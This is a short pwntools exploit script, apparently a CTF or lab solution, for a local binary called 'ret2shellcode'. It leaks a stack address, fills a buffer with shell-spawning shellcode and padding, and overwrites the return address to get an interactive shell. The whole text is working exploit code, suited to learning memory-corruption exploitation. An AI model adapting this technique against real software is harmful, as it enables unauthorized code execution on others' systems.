from pwn import *

context.arch = "i386"
p = process("./ret2shellcode")
gdb.attach(p,"b *0x08048593")

p.recvuntil("ret2shellcode\n")
target = int(p.recvuntil("\n",drop = True),16)
sc = asm(shellcraft.sh())
payload = sc.ljust(0x108,"\x00") + "junk" + p32(target)
p.sendline(payload)
p.interactive()
